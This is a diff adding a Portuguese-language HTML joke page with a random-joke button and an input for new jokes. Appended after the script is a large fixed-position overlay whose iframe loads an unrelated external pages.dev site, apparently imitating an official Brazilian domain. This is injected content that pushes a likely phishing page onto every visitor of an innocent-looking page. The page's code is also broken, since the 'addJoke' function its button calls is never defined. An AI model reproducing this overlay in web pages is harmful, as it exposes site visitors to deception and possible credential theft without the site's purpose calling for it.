@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description" content="Página divertida com pegadinhas e piadas prontas para animar seu dia. Adicione novas pegadinhas e compartilhe boas risadas!">
+  <meta name="keywords" content="pegadinhas, piadas, humor, brincadeiras, site de piadas, página de humor">
+  <meta name="author" content="DokeHost">
+  <meta property="og:title" content="Página de Pegadinhas Divertidas" />
+  <meta property="og:description" content="Veja e adicione pegadinhas engraçadas! Página interativa com humor e diversão.">
+  <meta property="og:type" content="website" />
+  <meta property="og:image" content="https://example.com/imagem-de-piada.jpg" />
+  <meta property="og:url" content="https://www.dokehost.com/pegadinhas" />
+  <title>Página de Pegadinhas Engraçadas | DokeHost Humor</title>
+
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #fff3cd;
+      color: #333;
+      padding: 30px;
+      margin: 0;
+    }
+
+    header {
+      text-align: center;
+      padding-bottom: 20px;
+    }
+
+    h1 {
+      color: #d63384;
+      font-size: 2em;
+    }
+
+    main {
+      max-width: 800px;
+      margin: auto;
+      background: #ffffff;
+      border-radius: 10px;
+      padding: 20px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+
+    #jokeBox {
+      margin: 20px 0;
+      padding: 20px;
+      background: #ffeeba;
+      border: 2px dashed #ffc107;
+      border-radius: 10px;
+      font-size: 1.2em;
+    }
+
+    button {
+      padding: 10px 20px;
+      margin: 10px;
+      background-color: #fd7e14;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+
+    button:hover {
+      background-color: #e8590c;
+    }
+
+    input {
+      padding: 10px;
+      width: 300px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      margin-top: 20px;
+    }
+
+    footer {
+      text-align: center;
+      font-size: 0.9em;
+      margin-top: 40px;
+      color: #888;
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <h1>Pegadinhas e Piadas Engraçadas para Rir Agora!</h1>
+    <p>Descubra pegadinhas hilárias e compartilhe as suas. Humor garantido sem sair da página!</p>
+  </header>
+
+  <main role="main">
+    <section aria-label="Área de Pegadinhas">
+      <div id="jokeBox">Clique no botão abaixo para ver uma pegadinha aleatória!</div>
+
+      <button onclick="showRandomJoke()" aria-label="Mostrar uma nova pegadinha">Mostrar Pegadinha Aleatória</button><br>
+
+      <input type="text" id="newJokeInput" placeholder="Digite sua pegadinha aqui..." aria-label="Campo para adicionar nova pegadinha" />
+      <button onclick="addJoke()" aria-label="Adicionar nova pegadinha">Adicionar Pegadinha</button>
+    </section>
+  </main>
+
+  <footer>
+    <p>&copy; . Todas as piadas são por sua conta. 😄</p>
+  </footer>
+
+  <script>
+    const jokes = [
+      "Por que o menino levou o computador no médico? Porque ele estava com um vírus!",
+      "Como o elétron atende ao telefone? Próton!",
+      "O que o zero disse para o oito? Que cinto maneiro!",
+      "Qual o cúmulo da organização? Guardar piada em ordem alfabética!",
+      "Por que o livro foi ao hospital? Porque ele tinha muitas páginas em branco!"
+    ];
+
+    function showRandomJoke() {
+      const index = Math.floor(Math.random() * jokes.length);
+      document.getElementById('jokeBox').innerText = jokes[index];
+    }
+
+    
+  </script>
+  <div style="position:fixed;bottom:20px;right:20px;width:90vw;max-width:350px;height:70vh;max-height:500px;z-index:9999;box-shadow:0 0 15px rgba(0,0,0,0.3);"><button onclick="this.parentElement.style.display='none'" style="position:absolute;top:-10px;right:-10px;background:red;color:white;border:none;border-radius:50%;width:25px;height:25px;font-weight:bold;cursor:pointer;z-index:10000;">×</button><iframe src="https://espiritosantoes-com-brprincipal.pages.dev/" title="Site Flutuante" style="width:100%;height:100%;border:none;"></iframe></div>
+
+</body>
+</html>
